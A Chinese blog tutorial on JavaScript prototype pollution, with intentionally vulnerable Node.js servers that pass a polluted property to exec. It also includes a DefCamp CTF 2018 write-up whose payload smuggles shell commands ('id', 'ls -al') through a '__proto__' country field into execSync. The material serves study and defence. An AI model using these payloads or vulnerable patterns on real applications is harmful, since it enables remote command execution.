![11.png](https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/prototype/11.png)\n\n\n\n这是一种通过已实例化的对象来进行回溯原型污染，还可以是下面这种直接操作构造函数的形式：\n\n\n\n![12](https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/prototype/12.png)\n\n\n\n当我们可操控的对象不是最终 Object 构造函数形成的时候，我们可以使用 testObj.\\_\\_proto\\_\\_.\\_\\_proto\\_\\_ 这种方法来回溯。\n\n下面给出一个测试例子：\n\n```javascript\nvar url = require('url');\nvar http = require('http');\nvar fs = require('fs');\nvar exec = require('child_process').exec;\n\nhttp.createServer(function(req,res){\n        var req_url = req.url;\n        var str_url = url.parse(req_url,true).query;\n        var path1 = String(str_url.pathname1);\n        var path2 = String(str_url.pathname2);\n        var value = String(str_url.value);\n        var obj = {earth:{country:'UK'}};\n        obj[path1][path2] = value;\n        console.log(obj)\n        var test = {};\n        exec(test.vul,function(err,data,stderr){\n        if(err){\n                console.log(stderr);\n        }\n        else{\n                console.log(data);\n        }\n})}).listen(1234);\n\n```\n\n\n\n\n\n客户端：\n\n````html\n<form action='http://127.0.0.1:1234' method=\"get\">\npathname1:<input type=\"text\" name=\"pathname1\"> <br>\npathname2:<input type=\"text\" name=\"pathname2\"> <br>\nvalue   :<input type:\"text\" name=\"value\"> <br>\n<input type='submit' name='submit'>\n</form>\n````\n\n我们访问客户端来构造利用 payload :\n\n```\npathname1 = __proto__\npathname2 = a\nvalue = command\n```\n\n\n\n ![13](https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/prototype/13.png)\n\n\n\n\n\n### 2、控制了路径赋值参数\n\n有的 api 里面有通过传入路径来给对象属性赋值的方法，如果部分参数可控，便可以达到原型链污染的目的，沿用上面的代码例子，我们引入 pathval 这个第三方 api，通过里面的 setPathVal 方法，来触发原型链污染的漏洞：\n\n```javascript\n// 服务端\nvar url = require('url');\nvar http = require('http');\nvar fs = require('fs');\nvar exec = require('child_process').exec;\nvar pathval = require('pathval');\nhttp.createServer(function(req,res){\n        var req_url = req.url;\n        var str_url = url.parse(req_url,true).query;\n        var path1 = String(str_url.pathname1);\n        var value = String(str_url.value);\n        var obj = {earth:{country:'UK'}};\n        pathval.setPathValue(obj,path1,value)\n        var test = {};\n        exec(test.vul,function(err,data,stderr){\n        if(err){\n                console.log(stderr);\n        }\n        else{\n                console.log(data);\n        }\n})}).listen(1234);\n\n```\n\n\n\n ![14](https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/prototype/14.png)\n\n\n\n\n\n\n\n### 3、对象克隆\n\n实质上还是递归进行合并的做法，我们可以用前面分析过的方法理解。下面我们提下一般深层克隆的方法：\n\n```javascript\n<script>\n    var obj = {\n        name: \"rt95\",\n        age: 20,\n        monry: 1000\n    };\n    var obj1 = {};\n\n    function clone(origin, target) {\n        target = target || {};\n\n        toStr = Object.prototype.toString;\n        arrstr = \"[object Array]\";\n        for (prop in origin) {\n            if (origin.hasOwnProperty(prop)) {\n                if (typeof(origin[prop]) === \"object\") {\n                    if (toStr.call(prop) === arrstr) {\n                        target[prop] = [];\n                    } else {\n                        target[prop] = {};\n                    }\n                    clone(origin[prop], target[prop])\n                } else {\n                    target[prop] = origin[prop];\n                }\n            }\n        }\n    }\n\n    clone(obj, obj1);\n</script>\n```\n\n\n\n大致流程就是：\n\n```\n1、生成克隆对象 ------>\n2、判断 origin（被克隆对象）的元素是原始值还是引用值 ------>\n3、原始值直接进行赋值，引用值需要分情况 ------>\n4、引用值如果是数组，那么在克隆对象中创建一个空数组，然后递归上面原始值的克隆过程 ----->\n5、引用值如果是对象，那么在克隆对象中创建一个空对象，然后递归上面原始值的克隆过程。\n```\n\n\n\n>原始值：\n>\n>存储在栈（stack）中的简单数据段，也就是说，它们的值直接存储在变量访问的位置。\n>\n>\n>\n>引用值：\n>\n>存储在堆（heap）中的对象，也就是说，存储在变量处的值是一个指针（point），指向存储对象的内存处。\n\n- 原始值就是单变量形成的值，值一般是字面量，像整数，字符串等。\n- 引用值就是对象，数组等结构型的值。\n\n那么克隆引用值的时候赋给克隆对象的值将会是原对象所指的数据处，那么相当于克隆对象和被克隆对象共有这组值。所以为了实现完全独一份的克隆，我们需要深入到引用值内部元素，然后进行克隆对象新建相应引用值类型数据结构后的逐一赋值。\n\n\n\n\n\n\n\n\n\n# 4@ 实战题目\n\n\n\n题目来源于 DefCamp CTF 2018 ，源码可以[在这下载](https://dctf.def.camp/dctf-18-quals-81249812/chat.zip)。\n\n\n\n```javscript\n// 客户端代码\nconst io = require('socket.io-client')\nconst socket = io.connect('https://chat.dctfq18.def.camp') // 此处我们可以设为本地测试的地址\n\nif(process.argv.length != 4) {\n  console.log('name and channel missing')\n   process.exit()\n}\nconsole.log('Logging as ' + process.argv[2] + ' on ' + process.argv[3])\nvar inputUser = {\n  name: process.argv[2],\n};\n\nsocket.on('message', function(msg) {\n  console.log(msg.from,\"[\", msg.channel!==undefined?msg.channel:'Default',\"]\", \"says:\\n\", msg.message);\n});\n\nsocket.on('error', function (err) {\n  console.log('received socket error:')\n  console.log(err)\n})\n\nsocket.emit('register', JSON.stringify(inputUser));\nsocket.emit('message', JSON.stringify({ msg: \"hello\" }));\nsocket.emit('join', process.argv[3]);//ps: you should keep your channels private\nsocket.emit('message', JSON.stringify({ channel: process.argv[3], msg: \"hello channel\" }));\nsocket.emit('message', JSON.stringify({ channel: \"test\", msg: \"i own you\" }));\n\n```\n\n从命令行接受进入参数后，然后将序列化后的数据发送到服务端，触发服务端事件。\n\n在源码包里面我们发现了服务端引用模块文件 helper.js 中有如下执行系统命令的方法：\n\n````\ngetAscii: function(message) {\n        var e = require('child_process');\n        return e.execSync(\"cowsay '\" + message + \"'\").toString();\n    }\n\n````\n\n在服务端代码中定位到使用此方法的位置：在 join 和 leave 事件里面都有使用：\n\n\n\n```javascript\n// 服务端代码\n.......\n\nio.on('connection', function (client) { \n    client.on('register', function(inUser) {\n        try {\n            newUser = helper.clone(JSON.parse(inUser))\n\n.........\n\n    client.on('join', function(channel) {\n        try {\n            clientManager.joinChannel(client, channel);\n            sendMessageToClient(client,\"Server\", \n                \"You joined channel\", channel)\n\n            var u = clientManager.getUsername(client);\n            var c = clientManager.getCountry(client);\n\n            sendMessageToChannel(channel,\"Server\", \n                helper.getAscii(\"User \" + u + \" living in \" + c + \" joined channel\"))\n        } catch(e) { console.log(e); client.disconnect() }\n    });\n\n    client.on('leave', function(channel) {\n        try {\n            client .join(channel);\n            clientManager.leaveChannel(client, channel);\n            sendMessageToClient(client,\"Server\", \n                \"You left channel\", channel)\n\n            var u = clientManager.getUsername(client);\n            var c = clientManager.getCountry(client);\n            sendMessageToChannel(channel, \"Server\", \n                helper.getAscii(\"User \" + u + \" living in \" + c + \" left channel\"))\n        } catch(e) { console.log(e); client.disconnect() }\n    });\nserver.listen(3000, function (err) {\n  if (err) throw err;\n  console.log('listening on port 3000');  // 这里的端口也可以改为本地测试端口\n});\n\n```\n\n\n\n参数 u 和 c 是通过模块 clientManager 中的 getUsername 方法和 getCountry 方法得到，跟进到 clientManager.js 文件中：\n\n```javascript\n  getUsername: function (client) {\n        return this.clients[client.id].u.name;\n    },\n  getCountry: function (client) {\n        return this.clients[client.id].u.country;\n    }\n\n```\n\n直接返回原先服务端注册生成的用户信息，我们来看看那个方法：\n\n```javascript\nclientManager.registerClient(client, newUser); // newUser 就是客户端传来的经过 clone 和 JSON.parse() 处理的数据。\n```\n\n\n\n```javascript\n// clientManager.js\nregisterClient: function (client, user) {\n        this.clients[client.id] = { 'c': client,\n                                    'u': user,\n                                    'ch': {}\n        };\n    }\n```\n\n\n\n所以上面的 getAscii 方法中的 u 就是我们客户端传入的经过处理的数据，只需让这个对象的 country 属性变得可利用即可，那么可以直接赋值吗？很可惜被黑名单过滤了：\n\n```javascript\n// helper.js\n validUser: function(inp) {\n        var block = [\"source\",\"port\",\"font\",\"country\",\n                     \"location\",\"status\",\"lastname\"];\n        if(typeof inp !== 'object') {\n            return false;\n        }\n```\n\n被检测函数的黑名单过滤了，那么就不能直接给 country 属性赋值了，但是我们可以放到其原型里面，所以下面我们就来看看另一个处理传入数据的函数，clone() : \n\n```javascript\n<script>\n    function clone(obj) {\n\n        if (typeof obj !== 'object' || obj === null) {\n\n            return obj;\n        }\n\n        var newObj;\n        var cloneDeep = false;\n\n    ......\n            else {\n                var proto = Object.getPrototypeOf(obj);\n                if (proto && proto.isImmutable) {\n\t\t\t\t\n                    newObj = obj;\n                }\n                else {\n                    newObj = Object.create(proto);\n                    cloneDeep = true;\n                }\n            }\n        } else {\n            newObj = [];\n            cloneDeep = true;\n        }\n\n        if (cloneDeep) {\n            var keys = Object.getOwnPropertyNames(obj);\n\n            \n            for (var i = 0; i < keys.length; ++i) {\n                var key = keys[i];\n                var descriptor = Object.getOwnPropertyDescriptor(obj, key);\n                if (descriptor && (descriptor.get || descriptor.set)) {\n\n                    \n                    Object.defineProperty(newObj, key, descriptor);\n                }\n                else {\n                    newObj[key] = this.clone(obj[key]);\n                }\n            }\n        }\n\n        return newObj;\n    }\n</script>\n```\n\n\n\n由于我们传入的参数直接是对象（JSON.parse() 之后的结果），所以直接定位代码到处理对象的分支：\n\n```javascript\nelse {\n            newObj = Object.create(proto);\n            cloneDeep = true;\n}\n......\nif (cloneDeep) {\n            var keys = Object.getOwnPropertyNames(obj);\n\n\n            for (var i = 0; i < keys.length; ++i) {\n                var key = keys[i];\n                var descriptor = Object.getOwnPropertyDescriptor(obj, key);\n                if (descriptor && (descriptor.get || descriptor.set)) {\n\n\n                    Object.defineProperty(newObj, key, descriptor);\n                } else {\n                    newObj[key] = this.clone(obj[key]);\n                }\n            }\n        }\n\n        return newObj;\n```\n\n\n\n其中这个方法 `getOwnPropertyDescriptor()`,返回指定对象上自有属性的对应描述符，由于我们通过 JSON.parse() 方法传入的对象已经具有 \\_\\_proto\\_\\_ 这个属性了，所以可以用这个方法获取到。\n\n通过 Object.create() 函数创建对象，原型使用我们构造的对象的原型，即具有普通属性的 \\_\\_proto\\_\\_,则可以成功通过这个方法使得 newObj 拥有我们可控的 country 属性，而后面方法 `newObj[key]  = this.clone(obj[key])` 再写入一次还是这个结果。至此，属性 country 被写入到操作对象中，等待被调用数据，我们构造如下 payload ：\n\n```javascript\nconst io = require('socket.io-client')\nconst socket = io.connect('https://chat.dctfq18.def.camp')  // 测试时换为本地地址\n\nsocket.on('error', function (err) {\n  console.log('received socket error:')\n  console.log(err)\n})\n\nsocket.on('message', function(msg) {\n  console.log(msg.from,\"[\", msg.channel!==undefined?msg.channel:'Default',\"]\", \"says:\\n\", msg.message);\n});\n\nsocket.emit('register', `{\"name\":\"xxx\", \"__proto__\":{\"country\":\"xxx';id;echo 'xxx\"}}`);\nsocket.emit('message', JSON.stringify({ msg: \"hello\" }));\nsocket.emit('register', `{\"name\":\"xxx\", \"__proto__\":{\"country\":\"xxx';ls -al;echo 'xxx\"}}`);\n```\n\n访问触发：\n\n![15](https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/prototype/15.png)\n\n\n\n我们总结一下整个调用链：\n\n```\n1、客户端传入触发服务端 register 事件时的待解析的数据，包含原型的数据 ------>\n2、客户端触发服务端 register 事件，传入数据被 JSON.parse() 方法解析后传入 clone 方法,由于__proto__ 是普通属性，可以将 country 的值赋给返回的对象 ------>\n3、返回一个具有 country 属性的对象，值就是我们传入的值，拼接调用 getAscii 方法，执行命令 ------>\n4、服务端返回执行命令的消息给客户端，攻击达成\n```\n\n\n\n\n\n# 5@ 总结\n\n\n\n利用一定的函数特征可以检测出一部分的 api 是否具有潜在的 prototype_pollution 的风险，这里是一位国外学者分析的[结果](<https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf>)。\n\n其实这种攻击的防御是比较容易的，合并或者给对象属性赋值之前，检查键名是否为 `__proto__` 等敏感词即可。\n\n\n\n\n\n\n\nReference:\n\n`https://segmentfault.com/a/1190000008338987`\n\n`https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html`\n\n`https://juejin.im/entry/58dfbe0361ff4b006b16638`\n\n`https://blog.wonderkun.cc/2019/07/18/javascript%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/#more`\n\n`https://stackoverflow.com/questions/8453887/why-is-it-necessary-to-set-the-prototype-constructor`\n\n`https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf`\n","slug":"深入理解 javascript 原型链污染","published":1,"updated":"2020-05-12T03:13:51.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckbh7yzgp000bmp7gzmblrt8s","content":"<h1 id=\"1-前言\"><a href=\"#1-前言\" class=\"headerlink\" title=\"1@ 前言\"></a>1@ 前言</h1><p>最近开始着手编程能力的提高，主要学习和复习一些前端的知识。之前看到过 p 神博客中写到的 js 的原型链污染问题，于是自己进行了一定程度的学习和尝试，写下我的总结，供各位同学们参阅。</p>\n<h1 id=\"2-JS-的原型继承机制\"><a href=\"#2-JS-的原型继承机制\" class=\"headerlink\" title=\"2@ JS 的原型继承机制\"></a>2@ JS 的原型继承机制</h1><p>基础知识我在此就不做过多介绍了，还有所疑惑的同学可以<a href=\"https://blog.wonderkun.cc/2019/07/18/javascript%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/#more\" target=\"_blank\" rel=\"noopener\">戳这</a>,亦或是<a href=\"https://juejin.im/entry/58dfbe0361ff4b006b166388\" target=\"_blank\" rel=\"noopener\">戳这</a>。</p>\n<p>这里只简单说下我对 js 继承方法的理解。平常我们学到的大部分面向对象的语言都有类机制，也大多都有 class 这个关键字。而 js 大多还是使用最原生的原型链继承的方法，尽管 class 关键字已经被引入。</p>\n<blockquote>\n<p>新的关键字<code>class</code>从ES6开始正式被引入到JavaScript中。<code>class</code>的目的就是让定义类更简单。</p>\n</blockquote>\n<p>实际上，class 继承机制仍旧是原型继承实现的。</p>\n<p>我们现在拿一个其他具有类机制的语言看下，这里使用 python 做例子。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs python\"><span class=\"hljs-class\"><span class=\"hljs-keyword\">class</span> <span class=\"hljs-title\">Person</span><span class=\"hljs-params\">()</span>:</span><br>    <span class=\"hljs-function\"><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title\">__init__</span><span class=\"hljs-params\">(self,name,age)</span>:</span><br>        self.name = name<br>        self.age = age<br>        self.money = <span class=\"hljs-number\">1000</span><br><br>person = Person(<span class=\"hljs-string\">'rt95'</span>,<span class=\"hljs-number\">20</span>)<br>print(person.money) // <span class=\"hljs-number\">1000</span><br>print(person.name) // rt95<br></code></pre></td></tr></table></figure>\n\n<p>这里的继承机制很明显，person 这个对象的生成类就是 Person() 类，类中的一切方法和属性都被对象继承，亦可以被 extends 的子类继承。</p>\n<p>反观一下 Js 中的继承例子</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs javascript\"><span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">Person</span>(<span class=\"hljs-params\">name, age</span>) </span>&#123;<br>        <span class=\"hljs-keyword\">this</span>.name = name;<br>        <span class=\"hljs-keyword\">this</span>.age = age;<br>&#125;<br>Person.prototype.money = <span class=\"hljs-number\">1000</span>;<br><span class=\"hljs-keyword\">var</span> person = <span class=\"hljs-keyword\">new</span> Person(<span class=\"hljs-string\">\"rt95\"</span>, <span class=\"hljs-number\">20</span>);<br><span class=\"hljs-built_in\">console</span>.log(person.money);<br><span class=\"hljs-built_in\">console</span>.log(person.name);<br></code></pre></td></tr></table></figure>\n\n<p> <img class=\"lazyload\" data-original=\"https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/prototype/1.png\" src=\"data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==\" alt=\"1.png\"></p>\n<p>我们一般理解的是对象直接由类构造而来，而且构造函数是在类里面的一个方法。但是 Js 却恰恰相反，它的构造函数在外面，而真正的类被包含在构造函数里面，属于构造函数的一个属性 <strong>prototype</strong>,所以刚开始的时候用 Js 的对象和原型的时候会感觉到特别的蹩脚。</p>\n<p>我们可以这样来理解，以上面的例子为主，我们现在有一个对象 person ，它的类就是构造函数中的 Person.prototype, 而这个类的构造函数就是 Person()，其中：</p>\n<p><code>Person.prototype 和 person.__proto__</code> 指向的都是普通意义上 person 对象的类。用之前的面向对象思维理解 Js 的继承机制，可能会是个好办法，如果不喜欢这种办法，就按你舒服的方法来理解。</p>\n<h2 id=\"2-1-constructor\"><a href=\"#2-1-constructor\" class=\"headerlink\" title=\"2.1 constructor\"></a>2.1 constructor</h2><p>这里再提一个小点，我们在其他前端开发的代码中经常会看见类似下面的代码：</p>\n<figure class=\"highlight delphi\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs undefined\">Student.prototype<span class=\"hljs-function\">.<span class=\"hljs-keyword\">constructor</span> = <span class=\"hljs-title\">Student</span>;</span><br></code></pre></td></tr></table></figure>\n\n<p>类似场景大部分出现在构造函数中的原型直接使用了其他构造函数的原型生成对象，如下代码：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs javascript\"><span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">Person</span>(<span class=\"hljs-params\">name</span>) </span>&#123;<br>    <span class=\"hljs-keyword\">this</span>.name = name;<br>&#125;  <br><br>Person.prototype.copy = <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>) </span>&#123;  <br>    <span class=\"hljs-keyword\">return</span> <span class=\"hljs-keyword\">this</span>.constructor();<br>&#125;;  <br><br> <br><span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">Student</span>(<span class=\"hljs-params\">name</span>) </span>&#123;  <br>    Person.call(<span class=\"hljs-keyword\">this</span>, name);<br>&#125;  <br><br><br>Student.prototype = <span class=\"hljs-built_in\">Object</span>.create(Person.prototype);<br></code></pre></td></tr></table></figure>\n\n<p>上述代码在 Student 构造函数里面直接调用了 Person 构造函数的方法，而且构造函数的原型也直接改为了用 Person 构造函数原型创建的一个对象，即当下所有以 Student 这个构造函数构造的对象会继承所有 Person() 构造函数里面的属性和方法，可是，坏就坏在所有上面了，我们来继续看看下面的这个对象生成：</p>\n<p> <img class=\"lazyload\" data-original=\"https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/prototype/2.png\" src=\"data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==\" alt=\"2.png\"></p>\n<p>本来变量 rt95 就是 Student 这个构造函数创建的，只不过它内部使用了 Person 构造函数的方法和继承了一些属性，所以于情于理我们需要将这一点更改过来，使新创建对象们都能认识到自己真正的祖宗是谁！！！</p>\n<p>我们再来手动的更改一下这个构造函数的对象的属性，使用下面的例子做演示：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs javascript\"><span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">Foreign</span>(<span class=\"hljs-params\">shame</span>) </span>&#123;<br>      <span class=\"hljs-keyword\">this</span>.shame = shame;<br> &#125;<br><br>Foreign.prototype.copy = <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>) </span>&#123;<br>      <span class=\"hljs-keyword\">return</span> <span class=\"hljs-keyword\">this</span>.constructor();<br> &#125;;<br><br><br><span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">China</span>(<span class=\"hljs-params\">name, shame</span>) </span>&#123;<br>      Foreign.call(<span class=\"hljs-keyword\">this</span>, shame);<br>      <span class=\"hljs-keyword\">this</span>.name = name;<br> &#125;<br><br><br>China.prototype = <span class=\"hljs-built_in\">Object</span>.create(Foreign.prototype);<br>China.prototype.constructor = China;<br></code></pre></td></tr></table></figure>\n\n<p> <img class=\"lazyload\" data-original=\"https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/prototype/3.png\" src=\"data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==\" alt=\"3.png\"></p>\n<p>所以不光是人需要，代码也需要认清自己真正的祖先，否则会造成很多的麻烦。</p>\n<h1 id=\"3-Js-中的原型链污染\"><a href=\"#3-Js-中的原型链污染\" class=\"headerlink\" title=\"3@ Js 中的原型链污染\"></a>3@ Js 中的原型链污染</h1><p>这里我们就拿 p 神博客中的例子来一起探讨一下原型链污染的问题</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs javascript\"><span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">merge</span>(<span class=\"hljs-params\">target, source</span>) </span>&#123;<br>    <span class=\"hljs-keyword\">for</span> (<span class=\"hljs-keyword\">let</span> key <span class=\"hljs-keyword\">in</span> source) &#123;<br>        <span class=\"hljs-keyword\">if</span> (key <span class=\"hljs-keyword\">in</span> source &amp;&amp; key <span class=\"hljs-keyword\">in</span> target) &#123;<br>            merge(target[key], source[key])<br>        &#125; <span class=\"hljs-keyword\">else</span> &#123;<br>            target[key] = source[key]<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>\n\n<p>函数描述的就是合并两个对象。</p>\n<p>我们先使用原文给出的第一种 payload :</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs javascript\"><span class=\"hljs-keyword\">var</span> o1 = &#123;&#125;<br><span class=\"hljs-keyword\">var</span> o2 = &#123;<span class=\"hljs-attr\">a</span>: <span class=\"hljs-number\">1</span>, <span class=\"hljs-string\">\"__proto__\"</span>: &#123;<span class=\"hljs-attr\">b</span>: <span class=\"hljs-number\">2</span>&#125;&#125;<br>merge(o1, o2)<br></code></pre></td></tr></table></figure>\n\n<p> <img class=\"lazyload\" data-original=\"https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/prototype/4.png\" src=\"data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==\" alt=\"4.png\"></p>\n<p>可以看到，这种方式合并对象，js 引擎是把  _<em>proto_</em> 当做了真正的对象的原型指向的属性，所以里面的值会被附在 o1 对象的属性上面，不会污染原型链。</p>\n<p>我们再看第二个 payload :</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs javascript\"><span class=\"hljs-keyword\">let</span> o1 = &#123;&#125;<br><span class=\"hljs-keyword\">let</span> o2 = <span class=\"hljs-built_in\">JSON</span>.parse(<span class=\"hljs-string\">'&#123;\"a\": 1, \"__proto__\": &#123;\"b\": 2&#125;&#125;'</span>)<br>merge(o1, o2)<br></code></pre></td></tr></table></figure>\n\n<p><img class=\"lazyload\" data-original=\"https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/prototype/5.png\" src=\"data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==\" alt=\"5.png\"></p>\n<p>这里我们看到 b 的值已经成功被写入到了原型链中了，下面我们看看这两种不同处理的数据到底区别在哪。</p>\n<h2 id=\"3-1-真假-proto\"><a href=\"#3-1-真假-proto\" class=\"headerlink\" title=\"3.1 真假 _proto_\"></a>3.1 真假 _<em>proto_</em></h2><p>我们都知道，js 中每个对象都有自己的 _<em>proto_</em>,也就是它的原型，包括它的原型也具有这个属性。而这条继承链的终点就是 Object.prototype , 这也很容易验证：</p>\n<p> <img class=\"lazyload\" data-original=\"https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/prototype/6.png\" src=\"data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==\" alt=\"6.png\"></p>\n<p>那么如果我们能控制继承链终点的这个对象的属性，那么所有之后代码中生成的对象都会继承，也就此形成了原型链污染。那么我们有什么办法可以来向这个终点对象写入属性呢？</p>\n<p>我们首先尝试一下直接覆盖最终对象的 __proto__：</p>\n<p> <img class=\"lazyload\" data-original=\"https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/prototype/7.png\" src=\"data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==\" alt=\"7.png\"></p>\n<p>我们看到，虽然已经写进来了，但是并不是写到了终点对象的属性里面，也就是说，生成对象的原型的原型才是我们真正要操作的那个对象。那么现在我们想一下，这种办法生成的 __proto__ 属性永远都不可能是最终的那个对象的  __proto__,为什么呢？因为用这种方法构造出来的原型，其实还是调用了一次 Object 这个构造函数，那么最少也只能是二次继承终点对象。我们用这种方法覆盖 __proto__的方法是不成立的。</p>\n<p>那么有什么办法，我们构造的这个 __proto__会被认定为最终对象的 __proto__ 呢？目前没有直接修改的办法，因为我们不可能通过一次修改来改变系统保留的 __proto__ 属性，排除 那种直接可以操控的办法：</p>\n<p><code>xxx.__proto__.xxx = xxx</code></p>\n<p>但是我们可以构造一个普通的非系统保留的 __proto__ 属性，然后通过合并的方式来达到我们的目的。什么方法？上文已经提到了，就是 JSON.parse() 这个方法，因为解析这个 json 格式的字符串是从整体来看的，那么里面的 __proto__ 属性可以被解析为一个对象的普通属性。</p>\n<p> <img class=\"lazyload\" data-original=\"https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/prototype/8.png\" src=\"data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==\" alt=\"8.png\"></p>\n<p>通过对象颜色也可以看出来， 此时的这个 test对象，已经拥有了一个非系统保留的 __proto__ 属性，我们可以用下面的方法来检验：</p>\n<p> <img class=\"lazyload\" data-original=\"https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/prototype/9.png\" src=\"data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==\" alt=\"9.png\"></p>\n<p>那么我们可以通过键名合并的方式来将这个<code>假的</code> __proto__ 合并到 <code>真的</code> __proto__ 上面。调用上面的 merge() 方法实现。</p>\n<h2 id=\"3-2-其他的几种攻击场景\"><a href=\"#3-2-其他的几种攻击场景\" class=\"headerlink\" title=\"3.2 其他的几种攻击场景\"></a>3.2 其他的几种攻击场景</h2><h3 id=\"1、-控制了多个参数\"><a href=\"#1、-控制了多个参数\" class=\"headerlink\" title=\"1、 控制了多个参数\"></a>1、 控制了多个参数</h3><p>想象一下这个场景，用户可以控制对象的 3 个以上的参数，那么我们将直接有机会来改变终点原型的属性：</p>\n<p> <img class=\"lazyload\" data-original=\"https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/prototype/10.png\" 